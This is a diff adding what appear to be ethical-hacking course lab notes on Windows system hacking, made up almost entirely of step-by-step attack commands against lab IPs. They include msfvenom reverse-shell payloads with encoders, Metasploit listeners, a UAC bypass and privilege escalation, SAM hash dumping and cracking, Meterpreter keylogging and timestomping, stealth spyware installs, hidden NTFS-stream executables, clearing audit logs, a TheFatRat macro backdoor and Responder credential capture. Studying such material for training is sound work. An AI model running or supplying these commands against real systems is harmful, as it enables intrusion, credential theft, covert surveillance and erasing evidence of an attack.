@@ -1,0 +1,167 @@
+Module 06: System Hacking
+
+Dumping and Cracking SAM Hashes to Extract Plaintext Passwords
+	The Security Account Manager (SAM) is a database file present on Windows machines that stores user accounts and security descriptors for users on a local computer. It stores users' passwords in a hashed format (in LM hash and NTLM hash). You need to have administrator access to dump the contents of the SAM file.
+	cmd (administrator mode)
+	wmic useraccount get name,sid
+	PwDump7.exe > c:\hashes.txt
+	replace the box symbols before each user ID with its respective User Name
+	ophcrack\x86\ophcrack.exe
+	Load PWDUMP file
+	Table Selection window appears, select Vista free in the list and click Install.
+	Crack.
+
+Creating and Using Rainbow Tables
+	Winrtgen
+	Add table
+	Rainbow Table properties window appears. Select ntlm from Hash dropdown list. Set Min Len as 4, Max Len as 6 and Chain Count 4000000. Select loweralpha from Charset dropdown list (it depends upon Password)
+	rcrack_gui.exe to launch the RainbowCrack
+	File > Load NTLM Hashes from PWDUMP File
+	Rainbow Table > Search Rainbow Table
+	
+Auditing System Passwords Using L0phtCrack
+	Password Auditing Wizard
+	Choose Audit Type section appears, select Strong Password Audit
+	
+Exploiting Client Side Vulnerabilities and Establishing a VNC Session
+	msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=10.10.10.11 LPORT=444 -o /root/Desktop/Test.exe
+	Share Test.exe with http
+	msfconsole
+	use multi/handler and press Enter.
+	set payload windows/meterpreter/reverse_tcp and press Enter.
+	set LHOST 10.10.10.11 and press Enter.
+	set LPORT 444 and press Enter.
+	run
+	Download and run Test.exe in target Windows machine.
+	observe that one session is created or opened in the Meterpreter shell.
+	If the meterpreter command line does not start interacting with the victim machine automatically, type sessions -i 1 and press Enter to start interacting with the victim machine.
+	meterpreter command line type sysinfo.
+	run vnc
+	TightVNC: window appears with the victim Desktop showing in the window.
+	
+Escalating Privileges by Exploiting Client Side Vulnerabilities
+	msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.10.11 -f exe > Desktop/Exploit.exe
+	Share Exploit.exe with http
+	msfconsole
+	use exploit/multi/handler and press Enter.
+	set payload windows/meterpreter/reverse_tcp and press Enter.
+	set LHOST 10.10.10.11 and press Enter.
+	To start the listener, type exploit -j -z and press Enter.
+	Download and run Exploit.exe in target Windows machine.
+	observe that one session is created or opened in the Meterpreter shell.
+	Type sessions -i 1 and press Enter to start interacting with the victim machine.
+	getuid
+	Type run post/windows/gather/smart_hashdump and press Enter. The command fails to dump the passowrd hashes because of insufficient privileges.
+	We shall try to escalate the privileges by trying to bypass the user account control setting which is blocking you from gaining unrestricted access to the machine.
+	You will now issue a getsystem command that attempts to elevate the user privileges. The command issued is getsystem -t 1 which uses the Service - Named Pipe Impersonation (In Memory/Admin) Technique. This command also fails to escalate the privileges in our case.
+	background
+	use exploit/windows/local/bypassuac_fodhelper
+	show options
+	set SESSION 1
+	set payload windows/meterpreter/reverse_tcp
+	show options
+	set LHOST 10.10.10.11
+	set TARGET 0 (0 is nothing but Exploit Target ID)
+	exploit
+	getuid
+	Re-issue the getsystem command, in attempt to elevate privileges. Type getsystem and press Enter. Type getuid and press Enter. The meterpreter session is now running with SYSTEM privileges (NT AUTHORITY\SYSTEM)
+	run post/windows/gather/smart_hashdump
+	
+Hacking Windows 10 using Metasploit, and Post-Exploitation Using Meterpreter
+	msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.10.11 -f exe > Desktop/Backdoor.exe
+	Share Backdoor.exe with http
+	msfconsole
+	use exploit/multi/handler and press Enter.
+	set payload windows/meterpreter/reverse_tcp and press Enter.
+	set LHOST 10.10.10.11 and press Enter.
+	show options
+	To start the listener, type exploit -j -z and press Enter.
+	Download and run Backdoor.exe in target Windows machine.
+	observe that one session is created or opened in the Meterpreter shell.
+	Type sessions -i 1 and press Enter to start interacting with the victim machine.
+	sysinfo
+	ipconfig
+	getuid
+	pwd
+	ls
+	MACE attributes of secret.txt, type timestomp secret.txt -v
+	cd C:\; pwd; ls;
+	download bootmgr
+	search -f pagefile.sys
+	keyscan_start
+	keyscan_dump
+	idletime
+	shutdown
+
+User System Monitoring and Surveillance Using Spytech SpyAgent
+	Establish Remote Desktop Connection and install SpyAgent.
+	Setup password=spytech
+	Complete + Stealth Configuration
+	Load on Windows Startup
+	Start Monitoring
+	To bring SpyAgent out of stealth mode press CTRL+Shift+Alt+M
+	
+Web Activity Monitoring and Recording using Power Spy
+	Establish Remote Desktop Connection and install Power Spy.
+	Setup Power Spy
+	Stealth Configuration
+	Use Ctrl+Alt+X keys to unhide.
+	
+Hiding Files Using NTFS Streams
+	type c:\magic\calc.exe > c:\magic\readme.txt:calc.exe
+	mklink backdoor.exe readme.txt:calc.exe
+	
+Hiding Data Using White Space Steganography
+	snow -C -m "My swiss bank account number is 45656684512263" -p "magic" readme.txt readme2.txt
+	snow -C -p "magic" readme2.txt
+
+Image Steganography Using OpenStego (saves in .png)
+
+Image Steganography Using Quick Stego (saves in .bmp)
+
+Viewing, Enabling, and Clearing Audit Policies Using Auditpol
+	auditpol /get /category:*
+	auditpol /set /category:"system","account logon" /success:enable /failure:enable
+	auditpol /get /category:*
+	auditpol /clear /y
+	auditpol /get /category:*
+	
+Covert Channels using Covert_TCP
+	In Kali Linux, cc -o covert_tcp covert_tcp.c
+	Do the same in Ubuntu
+	To start a listener, type ./covert_tcp –dest 10.10.10.9 –source 10.10.10.11 –source_port 9999 –dest_port 8888 –server –file /home/ubuntu/Desktop/receive/receive.txt
+	In Kali Linux, Applications --> Sniffing & Spoofing and select Wireshark, monitor eth0
+	./covert_tcp –dest 10.10.10.9 –source 10.10.10.11 -source_port 8888 –dest_port 9999 –file /root/Desktop/send/message.txt
+	Covert_tcp changes header of the tcp packets and replaces it with the characters of the string one character at a time to send the message without being detected.
+	If you examine the communication between Ubuntu and Kali machines, i.e. 10.10.10.11 and 10.10.10.9 you will find each character of the message string being sent in individual packets over the network.
+
+Hacking Windows Server 2012 with a Malicious Office Document Using TheFatRat
+	In Kali Linux, open fatrat
+	[06] Create Fud Backdoor 1000% with PwnWinds [Excelent]
+	[3] Create exe file with apache + Powershell (FUD 100%)
+	Set LHOST IP, LPORT(4444), Output file
+	Choose Payload option, choose [ 3 ] windows/meterpreter/reverse_tcp by typing 3
+	Type 8 and press Enter to go to the application main menu
+	[07] Create Backdoor For Office with Microsploit by typing 7
+	|2| The Microsoft Office Macro on Windows by typing 2
+	Set LHOST IP, LPORT(4444), Output file
+	In Enter the message for the document body (ENTER = default):, leave it to default. In Are you want Use custom exe file backdoor (y/n) option type y.
+	Type /root/TheFatRat/output/payload.exe as Path
+	[ 3 ] windows/meterpreter/reverse_tcp by typing 3
+	Share the doc with web server.
+	msfconsole
+	Type use multi/handler and press Enter.
+	Type set payload windows/meterpreter/reverse_tcp and press Enter.
+	Type set LHOST 10.10.10.11 and press Enter.
+	Type set LPORT 4444 and press Enter.
+	run(start the listener)
+	Windows 2012, open the shared document in MS Word. Enable Content in the Security Warning alert.
+	In Kali  Linux, observe that one session is created or opened in the Meterpreter shell. (if not type sessions -i 1)
+	sysinfo
+
+Active Online Attack using Responder (LLMNR and NBT-NS)
+	In Kali Linux, responder -I eth0
+	Windows 10 victim machine, run > type \\ceh-tools in the Open field and click OK. Leave the Windows 10 machine running and switch back to Kali Linux machine.
+	When DNS resolution for this host fails, the machine will attempt to ask all other machines on the local network for the correct address via LLMNR on UDP/5355 or NBT-NS on UDP/137. An attacker can listen on a network for these LLMNR/NBT-NS broadcasts and respond to them.
+	Responder will collect the access credential hashes of the user logged in the victim machine. By default Responder stores logs in usr/share/responder/logs.
+	Crack passwords: john /usr/share/responder/logs/<file name of the logs.txt>
